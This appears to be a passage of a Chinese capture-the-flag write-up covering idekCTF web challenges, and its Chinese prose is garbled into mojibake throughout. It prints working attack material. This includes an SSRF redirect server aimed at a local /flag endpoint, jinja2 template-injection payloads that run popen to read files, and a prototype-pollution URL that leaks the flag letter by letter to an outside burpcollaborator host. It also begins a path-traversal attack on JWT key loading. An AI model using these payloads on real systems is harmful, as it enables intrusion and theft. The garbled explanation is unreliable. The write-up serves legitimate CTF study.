fetch(urls[0]).then((r =\u0026gt; {return r.text()})); const pageTwo = await fetch(urls[1]).then((r =\u0026gt; {return r.text()})); return Diff.diffLines(pageOne, pageTwo) } catch { return \u0026#39;error!\u0026#39; } }; app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { res.render(\u0026#39;index\u0026#39;); }); app.get(\u0026#39;/flag\u0026#39;, (req, res) =\u0026gt; { if(req.connection.remoteAddress == \u0026#39;::1\u0026#39;){ res.send(flag)} else{ res.send(\u0026#34;Forbidden\u0026#34;, 503)} }); app.post(\u0026#39;/diff\u0026#39;, async (req, res) =\u0026gt; { let { url1, url2 } = req.body if(typeof url1 !== \u0026#39;string\u0026#39; || typeof url2 !== \u0026#39;string\u0026#39;){ return res.send({error: \u0026#39;Invalid format received\u0026#39;}) }; let urls = [url1, url2]; for(url of urls){ const valid = await validifyURL(url); if(!valid){ return res.send({error: `Request to ${url} was denied`}); }; }; const difference = await diffURLs(urls); res.render(\u0026#39;diff\u0026#39;, { lines: difference }); }); app.listen(port, () =\u0026gt; { console.log(`App listening at http://localhost:${port}`) }); å¯ä»¥çœ‹åˆ°å¯¹è¯·æ±‚çš„urlç”¨ssrfFilterè¿›è¡Œè¿‡æ»¤ï¼Œä¸å…è®¸è®¿é—®æœ¬åœ°çš„/flagï¼Œä½†æ˜¯è¦flagå°±å¿…é¡»è¦ssrfï¼Œè¿™é‡ŒNodeçš„ç‰ˆæœ¬æ˜¯alpineï¼Œä¹Ÿæ²¡æ³•è¿›è¡Œhttpè¯·æ±‚åˆ‡åˆ†\näºæ˜¯æˆ‘å°è¯•æ„é€ ä¸€ä¸ªæ¶æ„htmlé¡µé¢åŒ…å«ä¸€ä¸ªè·³è½¬çš„jsè„šæœ¬ï¼Œä½†æ˜¯å­¦è‰ºä¸ç²¾ æ„é€ å¤±è´¥äº†ï¼›éšåæˆ‘åˆå°è¯•äº†DNSé‡ç»‘å®šï¼Œä½†æ˜¯ä¼šè¢«æ£€æµ‹å‡ºæ¥å¯¼è‡´åˆ©ç”¨å¤±è´¥\nåæ¥çœ‹äº†discordä¸­çš„è§£ç­”\næ‰€ä»¥è¯´é‡ç»‘å®šè¿˜æ˜¯å¯è¡Œçš„ï¼Œå› ä¸ºåœ¨ä¸€ä¸ªåŸŸåè¢«åå¤æ¨ªè·³åœ°è§£æipåœ°å€ï¼Œå¦‚æœç¬¬ä¸€æ¬¡è¢«è§£æä¸ºæˆ‘ä»¬æœåŠ¡å™¨åœ°åœ°å€è€Œç¬¬äºŒæ¬¡è¿”å›127.0.0.1å°±å¯ä»¥è¾¾åˆ°SSRFåœ°æ•ˆæœäº†ï¼›ä¸è¿‡çœ‹wpä¹‹åå‘ç°ç›´æ¥ç”¨pythonä¼šæ›´ç®€å•\nfrom flask import Flask, redirect from threading import Thread import requests local_url = \u0026#34;http://yourvps_ip:port/\u0026#34; app = Flask(__name__) reqCounter = 0 @app.route(\u0026#39;/\u0026#39;) def exploit(): global reqCounter if reqCounter == 0: reqCounter += 1 return \u0026#39;hey\u0026#39; else: reqCounter -= 1 return redirect(\u0026#39;http://localhost:1337/flag\u0026#39;) def start_server(): app.run(\u0026#39;0.0.0.0\u0026#39;, 88) def send_payload(): url = \u0026#34;http://difference-check.chal.idek.team/diff\u0026#34; payload = {\u0026#34;url1\u0026#34;: local_url, \u0026#34;url2\u0026#34;: \u0026#34;http://v3zbv72qksii3rrtyl113zsi096zuo.burpcollaborator.net/\u0026#34;} r = requests.post(url, data=payload) print(r.text) if __name__ == \u0026#39;__main__\u0026#39;: Thread(target=start_server).start() Thread(target=send_payload).start() idek{d1ff3r3nc3_ch3ck3r_d3ce1v3d_bY_d1ff3r3nc3s}\nä½¿ç”¨é‡å®šå‘çš„æ–¹å¼ï¼Œé¿å¼€ssrfFilterçš„è¿‡æ»¤ï¼Œå­¦åˆ°äº†\nSourceless Guessy Web \u0026ldquo;If it has a website its web\u0026rdquo;\nhttps://sgw.chal.imaginaryctf.org/\né¦–é¡µä¸Šæ²¡ä¸œè¥¿ï¼Œå°±ä¸¤è¡Œå­—\nè€Œä¸”ä¹Ÿä¸èƒ½çˆ†ç ´ï¼Œå°è¯•äº†ç»å…¸è·¯ç”±éƒ½æ²¡ä»€ä¹ˆååº”ï¼Œçœ‹å®¡æŸ¥å…ƒç´ \næŠ“åŒ…ä¼šçœ‹åˆ°å“åº”å¤´ä¸€ç›´å¸¦ç€report-uri=\u0026quot;https://sentry.repl.it/api/10/security/?sentry_key=xxxxè¿™æ ·çš„ä¸œè¥¿ï¼Œè®¿é—®https://sgw.chal.imaginaryctf.org/__replå°±ä¼šçœ‹åˆ°æºç äº†\nidek{why_do_people_keep_st0ring_secrets_0n_replit_w1th0ut_3nv}\nJinJail\u0026amp;Baby JinJail I\u0026rsquo;ve looked all over the internet for payloads or techniques to bypass my SSTI filter, but none would work! Surely this is secure?\nhttp://jinjail.chal.idek.team | https://ctf.idek.team/handouts/web/JinJail/jinjail-dist.zip\nJinjail was a bit harder than anticipated, so here\u0026rsquo;s a baby version without the character limit to familiarize yourself with some jinja2 SSTI techniques!\nhttp://baby-jinjail.chal.idek.team | https://ctf.idek.team/handouts/web/BabyJinJail/baby-jinjail-dist.zip\nï¼ˆè¿™ä¸ªå›¾é‡Œæ³¨é‡Šæœ‰ä¸€äº›ä¸å¯¹çš„åœ°æ–¹ æ‡’å¾—æ”¹äº†\næ„é€ å¡åˆ°æˆ‘çš„åœ°æ–¹æ˜¯ç¦ç”¨äº†å•åŒå¼•å·ï¼Œä¸€èˆ¬æƒ…å†µä¸‹è¿‡æ»¤å¼•å·å¯ä»¥ä½¿ç”¨chr()æ¥è¡¨ç¤ºå­—ç¬¦ï¼Œä½†æ˜¯è¿™ä¸ªæ–¹æ³•æœ‰éœ€è¦ç”¨åˆ°æ•°å­—ï¼›æˆ‘ä»¬ç°åœ¨éœ€è¦çš„æ˜¯ä¸€ä¸ªçº¯å­—æ¯çš„SSTI payload\n# official payload {{lipsum[(dict(__globals__=x)|list)[False]][(dict(os=x)|list)[False]][(dict(popen=x)|list)[False]]([(dict(cat=x)|list)[False]|center,(dict(galf=x)|list)[False]|reverse]|join)[(dict(daer=x)|list)[False]|reverse]()}} lipsumè·Ÿurl_for, get_flashed_messagesä¸€æ ·æ˜¯ä¸€ä¸ªåœ¨flaskä¸­çš„å†…ç½®å‡½æ•°ï¼Œæ¯”å¦‚url_forå¯ä»¥è¿™æ ·ç”¨\n{{url_for.__init__}} å¯¹äºå…³é”®å­—çš„è¿‡æ»¤ä½¿ç”¨äº†(dict()|list)[False]çš„æ–¹å¼è¿›è¡Œä¸€ä¸ªç»•è¿‡ï¼Œä½†æ˜¯è¯´å®è¯æˆ‘å¹¶ä¸æ¸…æ¥šè¿™ä¸ªFalseçš„ç”¨æ„æ˜¯ä»€ä¹ˆï¼Œå¦‚æœä¸å¸¦Falseæˆ–ç”¨äº†Trueè¿”å›çš„ç»“æœéƒ½æ˜¯ç©ºçš„ï¼Œæˆ‘ä¹Ÿæ²¡æœ‰æŸ¥åˆ°ç›¸å…³çš„èµ„æ–™ï¼ˆå¦‚æœæœ‰å¸¦å¸ˆå‚…çœ‹åˆ°äº†è¯·åŠ¡å¿…æŒ‡æ•™ï¼ï¼ï¼\nè¿˜æœ‰ä»discordé‡Œçœ‹åˆ°çš„å…¶å®ƒç‰ˆæœ¬çš„payloadï¼Œä¹Ÿæ˜¯ç”¨åˆ°äº†å„ç§å„æ ·çš„è¿‡æ»¤å™¨\n{{(dict(a=x)|last)[dict(__cl=x,ass__=x)|join][dict(__mro__=x)|last][dict(a=x)|last|count][dict(__subcl=x,asses__=x)|join]()[dict(gc=x)|last|int(base=(dict(aaaaaaaaaaaaaaaaaa=x)|last|count))]()[dict(open=x)|last](dict(fl=x,ag=x)|join)[dict(read=x)|last]()}} å¦‚æœæ­é…ä¸Šdict()è¿™æ ·çš„ç”¨æ³•ä¹Ÿæ˜¯å¯ä»¥æ¥|attr()çš„ï¼Œä¸Šé¢æˆ‘å†™çš„æ³¨é‡Šå¹¶æ²¡æœ‰è€ƒè™‘åˆ°è¿™ä¸€ç‚¹ï¼Œæˆ‘çš„ï¼ˆå› ä¸ºåšé¢˜çš„æ—¶å€™è¿˜ä¸æ¸…æ¥šè¿™äº›å¥‡å¦™çš„è¿‡æ»¤å™¨æ“ä½œï¼Œå­¦åˆ°å’¯\n{{((((dict|attr(dict(__mro__=x)|first))|last|attr(dict(__subclas=x)|first%2bdict(ses__=x)|first)()))[([a,a,a,a]|length|string%2b[a,a]|length|string%2b[a,a,a]|length|string)|int])(dict(fla=x)|first%2bdict(g=x)|first)|attr(dict(read=_x)|first)()}} idek{us1nG_f1lt3rs_t0_byP4s5_f1lt3r5}\nfancy-notes Your typical note taking app, but this time it\u0026rsquo;s fancy! Share your coolest notes with the admin, and if they\u0026rsquo;re cool enough, maybe he\u0026rsquo;ll give you a special prize.\nhttp://fancy-notes.chal.idek.team | https://ctf.idek.team/handouts/web/FancyNotes/fancy-notes-dist.zip\nä¸€ä¸ªflaskï¼Œæœ‰æäº¤notesçš„åœ°æ–¹ï¼Œå°è¯•SSTIå¤±è´¥\nçœ‹ä»£ç é€»è¾‘æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„\nfrom flask import Flask, redirect, request, session, send_from_directory, render_template import os import sqlite3 import subprocess app = Flask(__name__, static_url_path=\u0026#39;/static\u0026#39;, static_folder=\u0026#39;static\u0026#39;, template_folder=\u0026#39;templates\u0026#39;) app.secret_key = os.getenv(\u0026#39;SECRET\u0026#39;, \u0026#39;secret\u0026#39;) # secret passwdåœ¨ç¯å¢ƒå˜é‡ä¸­ ADMIN_PASS = os.getenv(\u0026#39;ADMIN_PASS\u0026#39;, \u0026#39;password\u0026#39;) flag = open(\u0026#39;flag.txt\u0026#39;, \u0026#39;r\u0026#39;).read() # flag is here def init_db(): con = sqlite3.connect(\u0026#39;/tmp/database.db\u0026#39;) # sqliteæ•°æ®åº“ cur = con.cursor() cur.execute(\u0026#39;CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT NOT NULL UNIQUE, password TEXT NOT NULL)\u0026#39;) cur.execute(\u0026#39;INSERT INTO USERS (username, password) VALUES (\u0026#34;admin\u0026#34;, ?)\u0026#39;, [ADMIN_PASS]) # æ’å…¥adminè´¦å·å¯†ç  cur.execute(\u0026#39;CREATE TABLE IF NOT EXISTS notes (title TEXT NOT NULL, content TEXT NOT NULL, owner TEXT NOT NULL)\u0026#39;) cur.execute(\u0026#39;INSERT INTO notes (title, content, owner) VALUES (\u0026#34;flag\u0026#34;, ?, 1)\u0026#39;, [flag]) # æ’å…¥flagè¿›å…¥notesè¡¨ con.commit() con.close() def try_login(username, password): # ä»æ•°æ®åº“ä¸­çœ‹æœ‰æ²¡æœ‰åŒ¹é…çš„è´¦å·å¯†ç  è¿”å›ç¬¬ä¸€æ¡ ä¸å­˜åœ¨è¦†ç›– con = sqlite3.connect(\u0026#39;/tmp/database.db\u0026#39;) cur = con.cursor() cur.execute(\u0026#39;SELECT * FROM users WHERE username = ? AND password = ?\u0026#39;, [username, password]) row = cur.fetchone() if row: return {\u0026#39;id\u0026#39;: row[0], \u0026#39;username\u0026#39;: row[1]} def try_register(username, password): # æ’å…¥æ–°çš„ç”¨æˆ·åæ•°æ®è¿›å…¥usersè¡¨ con = sqlite3.connect(\u0026#39;/tmp/database.db\u0026#39;) cur = con.cursor() try: cur.execute(\u0026#39;INSERT INTO users (username, password) VALUES (?, ?)\u0026#39;, [username, password]) except sqlite3.IntegrityError: return None con.commit() con.close() return True def find_note(query, user): # å¯»æ‰¾userçš„note con = sqlite3.connect(\u0026#39;/tmp/database.db\u0026#39;) cur = con.cursor() cur.execute(\u0026#39;SELECT title, content FROM notes WHERE owner = ? AND (INSTR(content, ?) OR INSTR(title,?))\u0026#39;, [user, query, query]) rows = cur.fetchone() return rows def get_notes(user): # å¾—åˆ°userçš„å…¨éƒ¨notes con = sqlite3.connect(\u0026#39;/tmp/database.db\u0026#39;) cur = con.cursor() cur.execute(\u0026#39;SELECT title, content FROM notes WHERE owner = ?\u0026#39;, [user]) rows = cur.fetchall() return rows def create_note(title, content, user): # åˆ›å»ºuserçš„noteè¿›å…¥notesè¡¨ con = sqlite3.connect(\u0026#39;/tmp/database.db\u0026#39;) cur = con.cursor() cur.execute(\u0026#39;SELECT title FROM notes where title=? AND owner=?\u0026#39;, [title, user]) row = cur.fetchone() if row: return False cur.execute(\u0026#39;INSERT INTO notes (title, content, owner) VALUES (?, ?, ?)\u0026#39;, [title, content, user]) con.commit() con.close() return True @app.before_first_request # è¯·æ±‚ä¹‹å‰å…ˆåˆ é™¤/tmp/database.db ä¹‹ååˆå§‹åŒ– def setup(): try: os.remove(\u0026#39;/tmp/database.db\u0026#39;) except: pass init_db() @app.after_request # è¿”å›å“åº”æ—¶é’ˆå¯¹cacheæ·»åŠ no-storeçš„å“åº”å¤´ def add_headers(response): response.headers[\u0026#39;Cache-Control\u0026#39;] = \u0026#39;no-store\u0026#39; return response @app.route(\u0026#39;/\u0026#39;) def index(): if not session: return redirect(\u0026#39;/login\u0026#39;) # æ²¡æœ‰sessionè®°å½•å…ˆç™»å½• notes = get_notes(session[\u0026#39;id\u0026#39;]) # session[\u0026#39;id\u0026#39;]ä¸­å­˜å‚¨id session[\u0026#39;username\u0026#39;]ä¸­å­˜å‚¨username return render_template(\u0026#39;index.html\u0026#39;, notes=notes, message=\u0026#39;select a note to fancify!\u0026#39;) # æ— è¿‡æ»¤ä½†æ˜¯ä¸å­˜åœ¨SSTI @app.route(\u0026#39;/login\u0026#39;, methods = [\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;GET\u0026#39;: return render_template(\u0026#39;login.html\u0026#39;) if request.method == \u0026#39;POST\u0026#39;: password = request.form[\u0026#39;password\u0026#39;] username = request.form[\u0026#39;username\u0026#39;] user = try_login(username, password) # åŒ¹é…adminæˆ–flag if user: session[\u0026#39;id\u0026#39;] = user[\u0026#39;id\u0026#39;] session[\u0026#39;username\u0026#39;] = user[\u0026#39;username\u0026#39;] return redirect(\u0026#39;/\u0026#39;) else: return render_template(\u0026#39;login.html\u0026#39;, message=\u0026#39;login failed!\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;GET\u0026#39;: return render_template(\u0026#39;register.html\u0026#39;) if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if try_register(username, password): return redirect(\u0026#39;/login\u0026#39;) return render_template(\u0026#39;register.html\u0026#39;, message=\u0026#39;registration failed!\u0026#39;) @app.route(\u0026#39;/create\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def create(): if not session: return redirect(\u0026#39;/login\u0026#39;) if session[\u0026#39;username\u0026#39;] == \u0026#39;admin\u0026#39;: return \u0026#39;nah\u0026#39; if request.method == \u0026#39;GET\u0026#39;: return render_template(\u0026#39;create.html\u0026#39;) if request.method == \u0026#39;POST\u0026#39;: title = request.form[\u0026#39;title\u0026#39;] content = request.form[\u0026#39;content\u0026#39;] if len(title) \u0026gt;= 36 or len(content) \u0026gt;= 256: # æ²¡æœ‰SSTI return \u0026#39;pls no\u0026#39; if create_note(title, content, session[\u0026#39;id\u0026#39;]): return render_template(\u0026#39;create.html\u0026#39;, message=\u0026#39;note successfully uploaded!\u0026#39;) return render_template(\u0026#39;create.html\u0026#39;, message=\u0026#39;you already have a note with that title!\u0026#39;) @app.route(\u0026#39;/fancy\u0026#39;) def fancify(): if not session: return redirect(\u0026#39;/login\u0026#39;) if \u0026#39;q\u0026#39; in request.args: # ä¸è®ºget or post def filter(obj): return any([len(v) \u0026gt; 1 and k != \u0026#39;q\u0026#39; for k, v in request.args.items()]) # é•¿åº¦ä¸è¶…è¿‡1 if not filter(request.args): results = find_note(request.args[\u0026#39;q\u0026#39;], session[\u0026#39;id\u0026#39;]) # æŸ¥æ‰¾userçš„note qæ˜¯titleæˆ–content if results: message = \u0026#39;here is your ğ’»ğ’¶ğ“ƒğ’¸ğ“ note!\u0026#39; else: message = \u0026#39;no notes found!\u0026#39; return render_template(\u0026#39;fancy.html\u0026#39;, note=results, message=message) return render_template(\u0026#39;fancy.html\u0026#39;, message=\u0026#39;bad format! Your style params should not be so long!\u0026#39;) return render_template(\u0026#39;fancy.html\u0026#39;) @app.route(\u0026#39;/report\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def report(): if not session: return redirect(\u0026#39;/\u0026#39;) if request.method == \u0026#39;GET\u0026#39;: return render_template(\u0026#39;report.html\u0026#39;) url = request.form[\u0026#39;url\u0026#39;] subprocess.Popen([\u0026#39;node\u0026#39;, \u0026#39;bot.js\u0026#39;, url], shell=False) return render_template(\u0026#39;report.html\u0026#39;, message=\u0026#39;admin visited your url!\u0026#39;) app.run(\u0026#39;0.0.0.0\u0026#39;, 1337) é™¤äº†app.pyè¿˜æœ‰ä¸€ä¸ªfancify.jsæœ‰ç‚¹ä¸œè¥¿\nfunction fancify(note) { color = (args.style || Math.floor(Math.random() * 6)).toString(); image = this.image || \u0026#39;/static/images/success.png\u0026#39;;\t// æ”¯æŒä¼ å…¥imageå‚æ•° styleElement = note.children[2]; styleElement.innerHTML = style; // i have no idea why i did this in such a scuffed way but I\u0026#39;m too lazy to change it. no this is not vulnerable note.className = `animation${color}`; img = new Image(); img.src = image note.append(img); } args = Arg.parse(location.search); noteElement = document.getElementById(\u0026#39;note\u0026#39;); if(noteElement){ fancify(noteElement); } äº¤äº’è¿‡ç¨‹æ€»ä½“æ˜¯è¿™æ ·çš„ï¼šå¯ä»¥è¾“å…¥å¹¶ä¿å­˜noteï¼Œä¹‹åé€‰æ‹©æˆ‘ä»¬çš„noteå°†å…¶fancifyä¹‹åæ¸²æŸ“å‡ºæ¥\nhttp://fancy-notes.chal.idek.team/fancy?q=Note+1\u0026amp;style=2 å…¶ä¸­é™¤äº†qä»¥å¤–çš„å‚æ•°é•¿åº¦ä¸è¶…è¿‡1ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šimageå¹¶ä¸”noteå­˜åœ¨å°±ä¼šå‡ºç°success.pngçš„å›¾ç‰‡ï¼ŒæŒ‡å®šäº†çš„è¯å°±æ˜¯å¯¹åº”å›¾ç‰‡\nå¦å¤–è¿˜æœ‰ä¸€ä¸ªç»å…¸reportçš„botï¼Œå®ƒä»¥adminèº«ä»½ç™»å…¥åå†™å…¥ä¸€æ¡å«æœ‰flagçš„noteï¼Œä¹‹åè®¿é—®æˆ‘ä»¬çš„url\næˆ‘ä¸€å¼€å§‹åœ¨pythonçš„SSTIéƒ¨åˆ†æµªè´¹äº†ä¸€éƒ¨åˆ†æ—¶é—´ï¼Œæƒ³ç€æ˜æ˜æ²¡æœ‰è¿‡æ»¤ä¸ºä»€ä¹ˆä¸èƒ½æ‰§è¡Œå‘½ä»¤ï¼Œåæ¥æ‰çŸ¥é“è€ƒç‚¹å°±ä¸åœ¨è¿™é‡Œ\nè¿™ä¸ªé¢˜å…¶å®è·Ÿ[uiuCTF2021]YANAå¾ˆåƒï¼Œä¹Ÿæ˜¯çº¯client-sideå®‰å…¨é—®é¢˜å’Œchar-by-charæ€æƒ³çš„è¿ç”¨ï¼Œè€Œæ›´æ–¹ä¾¿çš„æ˜¯è¿™é‡Œè¿å›æ˜¾æ–¹å¼éƒ½ååˆ†æ˜ç¡®ï¼šå«æœ‰æŒ‡å®šå†…å®¹çš„noteå­˜åœ¨åˆ™æ¸²æŸ“success.png ä¸å­˜åœ¨åˆ™ä¸æ¸²æŸ“ï¼Œå¹¶ä¸”è¿™ä¸ªå›¾ç‰‡æˆ‘ä»¬å¯ä»¥æŒ‡å®šï¼Œé‚£å°†å…¶è®¾ä¸ºæˆ‘ä»¬è‡ªå·±æœåŠ¡å™¨ä¸Šçš„å›¾ç‰‡ï¼Œå¹¶char-by-charçš„ç›²æ³¨æŸ¥è¯¢å­—ç¬¦å°±å¯ä»¥å¾—åˆ°flagçš„å†…å®¹äº†ï¼Œå°±åƒè¿™æ ·\nhttp://fancy-notes.chal.idek.team/fancy?q=idekctf{\u0026amp;image=http://5agyjdbu3db0w6e7n60w52wbq2wskh.burpcollaborator.net/ ä¸è¿‡å¹¶æ²¡æœ‰è¿™ä¹ˆè½»æ¾ï¼Œapp.pyä¸­é™åˆ¶äº†é™¤qå‚æ•°ä»¥å¤–çš„å‚æ•°å­—ç¬¦ä¸è¶…è¿‡1ï¼Œå¦‚ä½•ç»•è¿‡å‘¢ï¼Ÿ\nè‚¥è‚ çš„é¸¡è´¼ï¼Œåœ¨fancy.htmlä¸­å¼•å…¥äº†ä¸€ä¸ªå¤–éƒ¨çš„jsè„šæœ¬\n\u0026lt;script src=\u0026#34;https://raw.githack.com/stretchr/arg.js/master/dist/arg-1.4.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; è€Œè¿™ä¸ªarg.jsæ˜¯å­˜åœ¨jsåŸå‹æ±¡æŸ“çš„æ´å¹¶ä¸”æœ‰ç°æˆçš„POC-\u0026gt;https://github.com/BlackFan/client-side-prototype-pollution/blob/master/pp/arg-js.md\nè¿™ä¸å°±å¥½è¯´äº†ï¼Ÿ\nhttp://fancy-notes.chal.idek.team/fancy?q=idekctf{\u0026amp;__proto__[image]=x\u0026amp;__proto__[image]=http://5agyjdbu3db0w6e7n60w52wbq2wskh.burpcollaborator.net/ ä¹‹ååªéœ€è¦å¯¹qå‚æ•°çš„åé¢char-by-charåœ°ç›²æ³¨å³å¯\nå‚è€ƒï¼šwp\nsteghide-as-a-service As has long been demonstrated by CTF, only the most 1337 are capable of running steghide. To help bridge this immense skill gap, I created a web based tool for easy embedding of hidden messages.\nhttp://steghide-as-a-service.chal.idek.team/ | https://ctf.idek.team/handouts/web/SteghideAsAService/saas-dist.zip\nè·Ÿphpçš„ä¸ä¸€æ ·ï¼ˆä¸€èˆ¬è¦ç»•wafæ‹¿ä¸€ä¸ªwebshellï¼‰ï¼Œflaskçš„æ–‡ä»¶ä¸Šä¼ è€ƒç‚¹ä¸€èˆ¬åœ¨å…¶ä»–åœ°æ–¹ï¼Œæ¯”å¦‚ä¸€äº›tricks\u0026amp;SSTI\u0026amp;Cookieä¼ªé€ è¿™ç§çš„ï¼Œè¿™ä¸ªé¢˜ä¹Ÿä¸ä¾‹å¤–ï¼Œæ˜¯ä¸€ä¸ªLFI\nå…ˆå®¡ä¸€ä¸‹ä»£ç \n# app.py from flask import Flask, request, render_template, make_response, redirect, send_file import imghdr from imghdr import tests import hashlib from util import * # https://stackoverflow.com/questions/36870661/imghdr-python-cant-detec-type-of-some-images-image-extension # there are no bugs here. just patching imghdr JPEG_MARK = b\u0026#39;\\xff\\xd8\\xff\\xdb\\x00C\\x00\\x08\\x06\\x06\u0026#39; \\ b\u0026#39;\\x07\\x06\\x05\\x08\\x07\\x07\\x07\\t\\t\\x08\\n\\x0c\\x14\\r\\x0c\\x0b\\x0b\\x0c\\x19\\x12\\x13\\x0f\u0026#39; def test_jpeg1(h, f): \u0026#34;\u0026#34;\u0026#34;JPEG data in JFIF format\u0026#34;\u0026#34;\u0026#34; if b\u0026#39;JFIF\u0026#39; in h[:23]: return \u0026#39;jpeg\u0026#39; def test_jpeg2(h, f): \u0026#34;\u0026#34;\u0026#34;JPEG with small header\u0026#34;\u0026#34;\u0026#34; if len(h) \u0026gt;= 32 and 67 == h[5] and h[:32] == JPEG_MARK: return \u0026#39;jpeg\u0026#39; def test_jpeg3(h, f): \u0026#34;\u0026#34;\u0026#34;JPEG data in JFIF or Exif format\u0026#34;\u0026#34;\u0026#34; if h[6:10] in (b\u0026#39;JFIF\u0026#39;, b\u0026#39;Exif\u0026#39;) or h[:2] == b\u0026#39;\\xff\\xd8\u0026#39;: return \u0026#39;jpeg\u0026#39; tests.append(test_jpeg1) tests.append(test_jpeg2) tests.append(test_jpeg3) def verify_jpeg(file_path): try: jpeg = Image.open(file_path) jpeg.verify() if imghdr.what(file_path) != \u0026#39;jpeg\u0026#39;: return False return True except: return False app = Flask(__name__) app.config[\u0026#39;MAX_CONTENT_LENGTH\u0026#39;] = 2 * 1024 * 1024 @app.route(\u0026#39;/\u0026#39;) def index(): resp = make_response(render_template(\u0026#39;upload.html\u0026#39;)) if not request.cookies.get(\u0026#39;session\u0026#39;): resp.set_cookie(\u0026#39;session\u0026#39;, create_token()) return resp @app.route(\u0026#39;/upload\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def upload(): if not request.cookies.get(\u0026#39;session\u0026#39;): return redirect(\u0026#39;/\u0026#39;) session = request.cookies.get(\u0026#39;session\u0026#39;) uploaded_file = request.files[\u0026#39;file\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] content = request.form[\u0026#39;content\u0026#39;] upload_name = uploaded_file.filename.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) # no traversal! output_name = os.path.join(\u0026#39;output/\u0026#39;, os.path.basename(upload_name)) image_data = uploaded_file.stream.read() image_md5 = hashlib.md5(image_data).hexdigest() image_path = f\u0026#39;uploads/{image_md5}.jpeg\u0026#39; content_path = f\u0026#34;uploads/{rand_string()}.txt\u0026#34; # write temp txt file with open(content_path, \u0026#39;w\u0026#39;) as f: f.write(content) f.close() # write temp image file with open(image_path, \u0026#39;wb\u0026#39;) as f: f.write(image_data) f.close() # verify jpeg validity if not verify_jpeg(image_path): return \u0026#39;File is not a valid JPEG!\u0026#39;, 400 # verify session before using it session = verify_token(session) if not session: return \u0026#39;Session token invalid!\u0026#39;, 400 # attempt to embed message in image try: embed_file(content_path, image_path, output_name, password) except: return \u0026#39;Embedding failed!\u0026#39;, 400 # append username to output path to prevent vulns sanitized_path = f\u0026#39;output/{upload_name}_{session[\u0026#34;username\u0026#34;]}\u0026#39; try: if not os.path.exists(sanitized_path): os.rename(output_name, sanitized_path) except: pass try: return send_file(sanitized_path) except: return \u0026#39;Something went wrong! Check your file name\u0026#39;, 400 app.run(\u0026#39;0.0.0.0\u0026#39;, 1337) # util.py from PIL import Image import random import jwt import string import os from imghdr import tests import subprocess priv_key = open(\u0026#39;keys/private.pem\u0026#39;, \u0026#39;r\u0026#39;).read() def create_token(): priv_key = open(\u0026#39;keys/private.pem\u0026#39;, \u0026#39;r\u0026#39;).read() token = jwt.encode({\u0026#34;username\u0026#34;: f\u0026#34;guest_{random.randint(1,10000)}\u0026#34;}, priv_key, algorithm=\u0026#39;RS256\u0026#39;, headers={\u0026#39;pubkey\u0026#39;: \u0026#39;public.pem\u0026#39;}) return token def verify_token(token): try: headers = jwt.get_unverified_header(token) pub_key_path = headers[\u0026#39;pubkey\u0026#39;] pub_key_path = pub_key_path.replace(\u0026#39;..\u0026#39;, \u0026#39;\u0026#39;) # no traversal! pub_key_path = os.path.join(os.getcwd(), os.path.join(\u0026#39;keys/\u0026#39;, pub_key_path)) pub_key = open(pub_key_path, \u0026#39;rb\u0026#39;).read() if b\u0026#39;BEGIN PUBLIC KEY\u0026#39; not in pub_key: return False return jwt.decode(token, pub_key, algorithms=[\u0026#39;RS256\u0026#39;, \u0026#39;HS256\u0026#39;]) except: return False def rand_string(): return \u0026#39;\u0026#39;.join(random.choice(string.ascii_letters + string.digits) for i in range(32)) def embed_file(embed_file, cover_file, stegfile, password): cmd = subprocess.Popen([\u0026#39;steghide\u0026#39;, \u0026#39;embed\u0026#39;, \u0026#39;-ef\u0026#39;, embed_file, \u0026#39;-cf\u0026#39;, cover_file, \u0026#39;-sf\u0026#39;, stegfile, \u0026#39;-p\u0026#39;, password]).wait(timeout=.5) def cleanup(): for f in os.listdir(\u0026#39;uploads/\u0026#39;): os.remove(os.path.join(\u0026#39;uploads/\u0026#39;, f)) for f in os.listdir(\u0026#39;output/\u0026#39;): os.remove(os.path.join(\u0026#39;output/\u0026#39;, f)) é¡µé¢ä¸Šå¯ä»¥ä»¥ä»»æ„çš„contentå’Œpasswdä¸Šä¼ ä¸€ä¸ªjpg/jpegæ–‡ä»¶ï¼Œä¹‹åå¯ä»¥ä¸‹è½½filename.jpg_guest_3295è¿™æ ·çš„ä¸€ä¸ªæ–‡ä»¶ï¼Œå¹¶ä¸”æˆ‘ä»¬çš„jwtä¼šæ›´æ–°ï¼Œå…¶ä¸­usernameéƒ¨åˆ†å°±æ˜¯æ‹¼åœ¨.jpgåé¢çš„å†…å®¹\nåº·å…³é”®éƒ¨åˆ†æºç \nåˆ©ç”¨os.path.join()æˆ‘ä»¬å¯ä»¥ç›´æ¥å¾—åˆ°ä¸€ä¸ªä¸å—å¹²æ‰°çš„ç»å¯¹è·¯å¾„ï¼Œç±»ä¼¼è¿™æ ·\n\u0026gt;\u0026gt;\u0026gt; os.path.join(\u0026#39;amiz/tmp\u0026#39;,\u0026#39;/etc/passwd\u0026#39;) \u0026#39;/etc/passwd\u0026#39; ä¸Šä¼ 